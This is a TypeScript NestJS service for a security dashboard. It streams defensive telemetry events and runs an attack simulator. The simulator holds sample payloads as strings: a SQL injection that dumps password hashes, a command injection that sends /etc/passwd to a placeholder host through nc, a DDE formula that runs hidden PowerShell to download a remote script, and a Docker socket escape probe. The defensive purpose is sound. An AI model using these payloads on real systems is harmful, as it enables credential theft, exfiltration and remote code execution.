import { Injectable, Logger } from '@nestjs/common';
import { Subject, Observable } from 'rxjs';
import { map } from 'rxjs/operators';
import * as crypto from 'crypto';
import { FleetService, EnclaveAppId } from './fleet.service';
import { BreachResponseService } from './breach-response.service';
import { AttackerReconService } from './attacker-recon.service';
import { InfiniteLabyrinthService } from './infinite-labyrinth.service';
import { PqcCryptoService } from './pqc-crypto.service';
import { MtdEngineService } from './mtd-engine.service';

export interface CombatTelemetryEvent {
  id: string;
  timestamp: string;
  eventType: 'ATTACK_INTERCEPTED' | 'TARPIT_ENGAGED' | 'LABYRINTH_TRAP' | 'ENCLAVE_AIRGAP' | 'PQC_VERIFIED' | 'MTD_MORPH';
  targetEnclave: EnclaveAppId | 'vgruvs' | 'labyrinth';
  attackerIp: string;
  vector: string;
  payloadSnippet: string;
  mitreCode: string;
  actionTaken: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
}

@Injectable()
export class CombatRadarService {
  private readonly logger = new Logger(CombatRadarService.name);
  private readonly eventStream$ = new Subject<CombatTelemetryEvent>();

  // In-memory buffer of recent combat events for initial UI load
  private recentEvents: CombatTelemetryEvent[] = [];

  constructor(
    private readonly fleetService: FleetService,
    private readonly breachResponse: BreachResponseService,
    private readonly reconService: AttackerReconService,
    private readonly labyrinthService: InfiniteLabyrinthService,
    private readonly pqcService: PqcCryptoService,
    private readonly mtdService: MtdEngineService,
  ) {
    this.seedInitialRadar();
  }

  private seedInitialRadar() {
    this.pushEvent({
      id: 'CMB-001',
      timestamp: new Date(Date.now() - 1000 * 45).toISOString(),
      eventType: 'PQC_VERIFIED',
      targetEnclave: 'vgruvs',
      attackerIp: '127.0.0.1',
      vector: 'Lattice demo encapsulation',
      payloadSnippet: 'Hybrid Ed25519 + Kyber Polynomial Ring Verified',
      mitreCode: 'T1553',
      actionTaken: 'Quantum immunity attested for V-Gruvs Host transit',
      severity: 'MEDIUM',
    });

    this.pushEvent({
      id: 'CMB-002',
      timestamp: new Date(Date.now() - 1000 * 20).toISOString(),
      eventType: 'MTD_MORPH',
      targetEnclave: 'the-gruvs',
      attackerIp: '198.51.100.89',
      vector: 'Polymorphic Rolling Mask Slot Shift',
      payloadSnippet: 'Outdated route token expired after 60s window',
      mitreCode: 'T1595',
      actionTaken: 'Replay deflected; legitimate apps synced via CyPee Guard SDK',
      severity: 'HIGH',
    });
  }

  public pushEvent(event: CombatTelemetryEvent) {
    this.recentEvents.unshift(event);
    if (this.recentEvents.length > 50) this.recentEvents.pop();
    this.eventStream$.next(event);
  }

  /**
   * Observable stream for NestJS Server-Sent Events (@Sse).
   */
  public getCombatStream(): Observable<{ data: CombatTelemetryEvent }> {
    return this.eventStream$.asObservable().pipe(map((event) => ({ data: event })));
  }

  /**
   * Returns recent combat events buffer for initial render.
   */
  public getRecentCombatEvents(): CombatTelemetryEvent[] {
    return this.recentEvents;
  }

  /**
   * Interactive Adversary Attack Simulator for the Combat Deck UI.
   * Runs the real defense pipeline deterministically with zero AI cost.
   */
  public async simulateAdversaryAttack(params: {
    targetEnclave: 'vgruvs' | 'the-resident' | 'the-gruvs' | 'excellency' | 'labyrinth';
    attackType: string;
  }) {
    const target = params.targetEnclave || 'the-resident';
    const attackerIp = `198.51.100.${Math.floor(10 + Math.random() * 200)}`;
    const eventId = `CMB-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;

    let payloadSnippet = '';
    let vector = '';
    let mitreCode = '';
    let actionTaken = '';
    let eventType: CombatTelemetryEvent['eventType'] = 'ATTACK_INTERCEPTED';
    let dossierId = '';

    if (target === 'the-resident') {
      vector = 'SQL_INJECTION_AND_AUTH_BYPASS';
      payloadSnippet = "admin' OR '1'='1' UNION SELECT id, password_hash, salt FROM users--";
      mitreCode = 'T1190 / T1552';
      actionTaken = 'Cosine Bigram Vector Intercept + Slowloris Tarpit engaged + Honeytoken alert logged';
      eventType = 'TARPIT_ENGAGED';

      this.breachResponse.engageTarpit(attackerIp);
      const dossier = await this.reconService.captureAttackerTelemetry(
        attackerIp,
        'the-resident',
        '/api/v1/auth/login',
        'POST',
        { 'user-agent': 'sqlmap/1.7#dev', 'accept-language': 'en-US' },
        {},
        payloadSnippet,
        vector,
      );
      dossierId = dossier.dossierId;
    } else if (target === 'the-gruvs') {
      vector = 'CONCURRENCY_RACE_AND_COMMAND_INJECTION';
      payloadSnippet = '; cat /etc/passwd | nc 198.51.100.44 1337 # Concurrency Reentrancy Breach';
      mitreCode = 'T1059.004';
      actionTaken = 'Zero-Shell Seccomp blocked execve() + Distributed Mutex Lock held + Threat signature shared';
      eventType = 'ATTACK_INTERCEPTED';

      this.breachResponse.engageTarpit(attackerIp);
      const dossier = await this.reconService.captureAttackerTelemetry(
        attackerIp,
        'the-gruvs',
        '/api/v1/workflows/dispatch',
        'POST',
        { 'user-agent': 'curl/8.4.0', 'x-exploit-type': 'rce' },
        {},
        payloadSnippet,
        vector,
      );
      dossierId = dossier.dossierId;
    } else if (target === 'excellency') {
      vector = 'DDE_SPREADSHEET_FORMULA_INJECTION';
      payloadSnippet = '=cmd|\'/C powershell -w hidden -enc (New-Object Net.WebClient).DownloadString("http://198.51.100.89/d.ps1")\'!A0';
      mitreCode = 'T1559.001';
      actionTaken = 'DDE Formula Sanitizer neutralized command + Poisoned Ghost Canary served with tracking beacon';
      eventType = 'ATTACK_INTERCEPTED';

      const dossier = await this.reconService.captureAttackerTelemetry(
        attackerIp,
        'excellency',
        '/api/v1/sheets/export/csv',
        'POST',
        { 'user-agent': 'Python-requests/2.31.0' },
        { format: 'csv' },
        payloadSnippet,
        vector,
      );
      dossierId = dossier.dossierId;
    } else if (target === 'vgruvs') {
      vector = 'CONTAINER_ESCAPE_DOCKER_SOCKET_PROBE';
      payloadSnippet = 'unix:///var/run/docker.sock -> POST /v1.43/containers/create?Privileged=true';
      mitreCode = 'T1611';
      actionTaken = 'V-Gruvs eBPF LSM ring-0 denied mount + Airgap Isolation enforced on originating sandbox';
      eventType = 'ENCLAVE_AIRGAP';

      await this.fleetService.isolateEnclave('the-resident', 'FULL_AIRGAP');
      const dossier = await this.reconService.captureAttackerTelemetry(
        attackerIp,
        'vgruvs',
        '/vgruvs-hypervisor/breakout',
        'POST',
        { 'user-agent': 'Go-http-client/2.0' },
        {},
        payloadSnippet,
        vector,
      );
      dossierId = dossier.dossierId;
    } else {
      // Infinite Labyrinth
      vector = 'AUTOMATED_SCANNER_HONEYPOT_MAZE';
      payloadSnippet = 'GET /api/v1/labyrinth/query?q=UNION+SELECT+1,2,3,schema_name+FROM+information_schema.schemata';
      mitreCode = 'T1595.002';
      actionTaken = 'Trapped in Infinite Procedural Labyrinth; synthetic tables generated with 650ms socket drag';
      eventType = 'LABYRINTH_TRAP';

      const res = await this.labyrinthService.generateProceduralResponse(attackerIp, payloadSnippet, 'sqlmap/1.7 automated scan');
      actionTaken += ` (Table: ${res.schema.table}, ${res.rowsCount} rows procedural response generated in ${res.elapsedMs}ms)`;
    }

    const combatEvent: CombatTelemetryEvent = {
      id: eventId,
      timestamp: new Date().toISOString(),
      eventType,
      targetEnclave: target as any,
      attackerIp,
      vector,
      payloadSnippet,
      mitreCode,
      actionTaken,
      severity: 'CRITICAL',
    };

    this.pushEvent(combatEvent);

    return {
      combatEvent,
      dossierId: dossierId || 'DOSSIER-LABYRINTH-TRAPPED',
      tarpitEngaged: true,
      quantumImmunityVerified: true,
      mtdTokenRotated: true,
    };
  }
}
